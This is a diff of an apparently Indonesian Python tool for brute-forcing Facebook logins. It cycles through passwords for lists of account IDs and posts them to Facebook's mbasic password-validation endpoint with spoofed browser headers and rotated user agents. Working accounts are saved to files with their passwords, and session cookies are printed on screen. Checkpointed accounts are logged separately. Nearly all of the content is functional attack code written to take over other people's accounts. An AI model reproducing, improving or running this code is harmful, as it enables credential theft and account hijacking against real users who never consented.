@@ -139,7 +139,7 @@ def cobaa():
 	return bct
 
 ###ip = requests.get('https://api.ipify.org').text
-try:aan = open('ua.txt','r').read().splitlines()
+try:aan = open('user-agents_opera-touch_browser.txt','r').read().splitlines()
 except:aan = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]."]
 
 try:oppo = open('user-agents_oppo.txt','r').read().splitlines()
@@ -665,8 +665,8 @@ def setting():
 	print(f'{P}─────────────────────────────────────────────────────')
 	print(f'{P}┌─[{H}1{P}] Validate')
 	print(f'{P}├─[{H}2{P}] Async')
-	print(f'{P}├─[{H}3{P}] Beta Version  [{k} New {P}] ')
-	print(f'{P}├─[{H}4{P}] Mbasic ')
+	print(f'{P}├─[{H}3{P}] Beta Version  [{m} Maintenance {P}] ')
+	print(f'{P}├─[{H}4{P}] Mbasic  [{h} Update {P}] ')
 	hc = input('└───➢ ')
 	if hc in ['1','01']:
 		method.append('satu')
@@ -753,7 +753,7 @@ def crack(idf,pwv):
 	#sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}│{b}{len(id)}{P}│{ewe}{idf}{P}][Ok:{H}{ok}{P}][Cp:{k}{cp}{P}] ")
 	sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}/{b}{len(id)}{P}]—[{H}{ok}{P}]—[{k}{cp}{P}] ")
 	sys.stdout.flush()
-	ua = random.choice(ugen)
+	ua = random.choice(aan)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -850,7 +850,7 @@ def beta(idf,pwv):
 	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
 	sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}/{b}{len(id)}{P}]—[{H}{ok}{P}]—[{k}{cp}{P}] ")
 	sys.stdout.flush()
-	ua = random.choice(ugen)
+	ua = random.choice(aan)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -883,12 +883,11 @@ def beta(idf,pwv):
 	loop+=1
 #Mbasic
 def basic(idf,pwv):
-	bo = random.choice([m,k,h,b,u,x])
 	global loop,ok,cp
-	prog.update(des,description=f'\r{h}[𝐌𝐁𝐀𝐒𝐈𝐂] {xxx}{idf} {loop}/{len(id)} 𝙻𝙸𝚅𝙴-:[bold green]{ok}[/] 𝙲𝙷𝙴𝙲𝙺-:[bold yellow]{cp}[/]')
-	prog.advance(des)
+	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
+	sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}/{b}{len(id)}{P}]—[{H}{ok}{P}]—[{k}{cp}{P}] ")
+	sys.stdout.flush()
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -901,24 +900,26 @@ def basic(idf,pwv):
 			heade={'Host': f'{url}','cache-control': 'max-age=0','sec-ch-ua': '" Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post(f'https://{url}/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f"\r{N}[LOGIN CEPE] :{K} {idf}   {x}[PASSWORD] : {k} {pw}\n {x}USER AGENT :{hijo} {ua}  {N}")
-				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				#print(f'\r{P}└─ {k}{idf}{P}|{k}{pw}{N}')     
+				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				kukis = kuki.replace(f'c_user={idf};datr','sb')
-				print(f'\r{N}[LOGIN SUKSES] : {H}{idf}   {x}[PASSWORD] : {hijo} {pw}   COOKIE :{hijo} {kuki}\n   {x}USERT AGENT :{hijo} {ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P} └─ {H}{kuki}{N}')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				cek_apk(session,coki)
 				break
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
 			waktu(31)
 	loop+=1
-
+	
 if __name__=='__main__':
 	try:os.mkdir('OK')
 	except:pass
